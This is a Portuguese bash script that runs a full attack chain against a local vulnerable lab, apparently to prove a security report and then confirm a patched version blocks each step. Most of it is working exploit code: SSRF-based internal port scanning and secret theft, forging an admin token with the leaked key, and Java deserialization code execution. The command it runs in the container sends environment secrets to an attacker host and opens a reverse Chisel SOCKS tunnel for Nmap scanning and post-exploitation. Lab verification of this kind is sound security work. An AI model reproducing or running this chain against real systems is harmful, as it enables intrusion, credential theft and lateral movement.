#!/usr/bin/env bash
# Prova de rede do brecha, da borda até o painel interno, como no relatório:
#   1. SSRF do /v1 enumera a rede interna e lê a /config do painel;
#   2. o segredo vazado forja token de administrador do /v2;
#   3. a desserialização do /v1 executa comando no contêiner da API, que baixa
#      o Chisel do atacante e abre um túnel SOCKS reverso;
#   4. pelo túnel, Nmap enumera a rede interna e o painel entrega os segredos.
# Depois sobe a versão corrigida e confere que cada passo falha.
#
# Precisa de Docker, Java 21 com o projeto compilado (mvn package), Python 3,
# nmap e proxychains4. Uso, da raiz: bash infra/rede/provar.sh
set -euo pipefail
cd "$(dirname "$0")/../.."

TRABALHO=$(mktemp -d)
LAB=(docker compose -p brecha-lab -f docker-compose.yml -f docker-compose.waf-fraco.yml)
CORRIGIDO=(docker compose -p brecha-corrigido -f docker-compose.yml -f docker-compose.corrigido.yml)
falhas=0
conferir() { if [ "$1" = 0 ]; then echo "ok     $2"; else echo "FALHOU $2"; falhas=$((falhas + 1)); fi; }
verificar() { local d=$1; shift; if "$@"; then conferir 0 "$d"; else conferir 1 "$d"; fi; }

derrubar() {
  if [ "${1:-0}" != 0 ]; then "${LAB[@]}" logs --no-color --tail=40 api painel || true; fi
  kill "${PIDS[@]}" 2>/dev/null || true
  "${LAB[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
  "${CORRIGIDO[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
  rm -rf "$TRABALHO"
}
PIDS=()
trap 'derrubar $?' EXIT

# Segredos novos a cada execução.
BRECHA_SEGREDO="lab-$(openssl rand -hex 24)"
DJANGO_SECRET_KEY=$(openssl rand -hex 32)
RELATORIOS_TOKEN_DE_SERVICO=$(openssl rand -hex 24)
PGPASSWORD=$(openssl rand -hex 24)
COMPROVANTES_CHAVE_CIFRA=$(openssl rand -hex 32)
COMPROVANTES_CHAVE_ASSINATURA=$(openssl rand -hex 32)
export BRECHA_SEGREDO DJANGO_SECRET_KEY RELATORIOS_TOKEN_DE_SERVICO PGPASSWORD COMPROVANTES_CHAVE_CIFRA COMPROVANTES_CHAVE_ASSINATURA

# Chisel do atacante, conferido contra o checksum oficial antes de usar.
CHISEL_VERSAO=1.13.0
CHISEL_SHA256=902a38e824bfb4d4e428faa45607a9b71fc74ff28bf1392cf8121650061c6971
curl -fsSL -o "$TRABALHO/chisel.gz" "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VERSAO}/chisel_${CHISEL_VERSAO}_linux_amd64.gz"
echo "$CHISEL_SHA256  $TRABALHO/chisel.gz" | sha256sum -c - >/dev/null
gunzip "$TRABALHO/chisel.gz" && chmod +x "$TRABALHO/chisel"

"${LAB[@]}" up -d --build --wait --wait-timeout 300

API=http://127.0.0.1:8080
ana_v1=$(curl -fsS -X POST "$API/v1/sessoes" -H 'Content-Type: application/json' \
  -d '{"email":"ana@exemplo.com.br","senha":"ana-senha-2026"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

echo
echo "Exposição"
nao_publicado() { ! "${LAB[@]}" port "$1" "$2" >/dev/null 2>&1; }
verificar "o painel não tem porta publicada" nao_publicado painel 8080
verificar "o banco não tem porta publicada" nao_publicado banco 5432

echo
echo "1. Enumeração da rede interna pelo SSRF do /v1"
sondar() { # host porta -> aberta-http, aberta-nao-http, fechada, sem-host
  local corpo
  corpo=$(curl -sS -X POST "$API/v1/comprovantes/importar" -H "Authorization: Bearer $ana_v1" \
    -H 'Content-Type: application/json' -d "{\"url\":\"http://$1:$2/\"}" -w '\n%{http_code}')
  case "$corpo" in
    *$'\n'200) echo aberta-http ;;
    *ConnectException*) echo fechada ;;
    *UnresolvedAddress*|*UnknownHost*) echo sem-host ;;
    *) echo aberta-nao-http ;;
  esac
}
declare -A mapa
for host in banco painel relatorios comprovantes api inexistente; do
  linha="$host:"
  for porta in 22 5432 8000 8080 8090; do
    estado=$(sondar "$host" "$porta")
    mapa[$host:$porta]=$estado
    [ "$estado" = fechada ] || [ "$estado" = sem-host ] || linha="$linha $porta($estado)"
  done
  echo "       $linha"
done
verificar "o SSRF acha o painel na 8080" [ "${mapa[painel:8080]}" = aberta-http ]
verificar "o SSRF acha o Postgres na 5432 (aberta, não fala HTTP)" [ "${mapa[banco:5432]}" = aberta-nao-http ]
verificar "porta fechada aparece fechada" [ "${mapa[painel:22]}" = fechada ]
verificar "host que não existe aparece sem host" [ "${mapa[inexistente:8080]}" = sem-host ]

config=$(curl -fsS -X POST "$API/v1/comprovantes/importar" -H "Authorization: Bearer $ana_v1" \
  -H 'Content-Type: application/json' -d '{"url":"http://painel:8080/config"}')
segredo_vazado=$(python3 -c 'import json,sys; print(json.loads(json.load(sys.stdin)["conteudo"])["valores"]["BRECHA_SEGREDO"])' <<< "$config")
verificar "a /config do painel entrega o segredo do token do /v2" [ "$segredo_vazado" = "$BRECHA_SEGREDO" ]

echo
echo "2. Token de administrador forjado com o segredo vazado"
forjado=$(SEGREDO="$segredo_vazado" python3 - <<'PY'
import base64, hashlib, hmac, os, time
conteudo = base64.urlsafe_b64encode(f"3:ADMIN:{int(time.time()) + 600}".encode()).rstrip(b"=")
assinatura = base64.urlsafe_b64encode(hmac.new(os.environ["SEGREDO"].encode(), conteudo, hashlib.sha256).digest()).rstrip(b"=")
print((conteudo + b"." + assinatura).decode())
PY
)
admin_v2() { curl -fsS "$API/v2/admin/clientes" -H "Authorization: Bearer $forjado" | grep -q bruno@exemplo.com.br; }
verificar "o /v2, que estava corrigido, aceita o token forjado e lista os clientes" admin_v2

echo
echo "3. Execução de comando pela desserialização e túnel reverso"
python3 infra/rede/atacante.py 9100 "$TRABALHO/chisel" "$TRABALHO/coleta.txt" & PIDS+=($!)
"$TRABALHO/chisel" server --host 0.0.0.0 --port 9000 --reverse > "$TRABALHO/chisel.log" 2>&1 & PIDS+=($!)
sleep 2
comando='curl -fsS -o /tmp/c http://atacante:9100/chisel && chmod +x /tmp/c && { hostname -I; env; } | curl -fsS -X POST --data-binary @- http://atacante:9100/coleta; exec /tmp/c client atacante:9000 R:socks'
payload=$(java -cp target/classes infra/rede/GerarPayload.java bash -c "$comando")
status=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$API/v1/agendamentos" -H "Authorization: Bearer $ana_v1" \
  -H 'Content-Type: application/json' -d "{\"agendamento\":\"$payload\"}")
verificar "o /v1 aceita o agendamento serializado" [ "$status" = 200 ]
for _ in $(seq 1 30); do [ -s "$TRABALHO/coleta.txt" ] && grep -q "session" "$TRABALHO/chisel.log" && break; sleep 1; done
verificar "o contêiner da API mandou o próprio ambiente para o atacante" grep -q "BRECHA_SEGREDO=$BRECHA_SEGREDO" "$TRABALHO/coleta.txt"
verificar "o túnel SOCKS reverso abriu" grep -q "session" "$TRABALHO/chisel.log"

echo
echo "4. Enumeração com Nmap pelo túnel e pós-exploração"
cat > "$TRABALHO/proxychains.conf" <<'CONF'
strict_chain
quiet_mode
tcp_read_time_out 3000
tcp_connect_time_out 2000
[ProxyList]
socks5 127.0.0.1 1080
CONF
ips=$(head -1 "$TRABALHO/coleta.txt")
alvos=""
for ip in $ips; do alvos="$alvos ${ip%.*}.1-12"; done
echo "       redes da API: $ips"
# shellcheck disable=SC2086
proxychains4 -q -f "$TRABALHO/proxychains.conf" nmap -sT -Pn -n --open -p 5432,8080 $alvos -oG "$TRABALHO/nmap.txt" >/dev/null 2>&1 || true
grep "/open/" "$TRABALHO/nmap.txt" | sed 's/^/       /' || true
painel_ip=""
for ip in $(grep "8080/open" "$TRABALHO/nmap.txt" | awk '{print $2}'); do
  if proxychains4 -q -f "$TRABALHO/proxychains.conf" curl -fsS --max-time 5 "http://$ip:8080/" 2>/dev/null | grep -q "Painel de operação"; then
    painel_ip=$ip
  fi
done
verificar "o Nmap acha o Postgres pelo túnel" grep -q "5432/open" "$TRABALHO/nmap.txt"
verificar "o painel é identificado pelo túnel ($painel_ip)" [ -n "$painel_ip" ]
pos_exploracao() {
  proxychains4 -q -f "$TRABALHO/proxychains.conf" curl -fsS --max-time 5 "http://$painel_ip:8080/config" | grep -q "$PGPASSWORD"
}
verificar "pelo túnel, a /config entrega a senha do banco" pos_exploracao
kill "${PIDS[@]}" 2>/dev/null || true
PIDS=()

echo
echo "5. WAF contornado pela origem exposta"
inofensivo=$(java -cp target/classes infra/rede/GerarPayload.java true)
status_agendamento() {
  curl -s -o /dev/null -w '%{http_code}' -X POST "$1/v1/agendamentos" -H "Authorization: Bearer $ana_v1"     -H 'Content-Type: application/json' -d "{\"agendamento\":\"$inofensivo\"}"
}
pelo_waf=$(status_agendamento http://127.0.0.1:8081)
pela_origem=$(status_agendamento "$API")
verificar "pelo WAF, o objeto Java serializado é barrado (status $pelo_waf)" [ "$pelo_waf" = 403 ]
verificar "direto na origem, o mesmo pedido passa (status $pela_origem)" [ "$pela_origem" = 200 ]

# As duas versões usam as mesmas portas na máquina: o laboratório sai antes.
"${LAB[@]}" down -v --remove-orphans >/dev/null 2>&1
echo
bash infra/rede/provar-corrigido.sh "$TRABALHO" || falhas=$((falhas + 1))

echo
if [ "$falhas" != 0 ]; then echo "$falhas verificação(ões) falharam"; exit 1; fi
echo "Todas as verificações passaram."
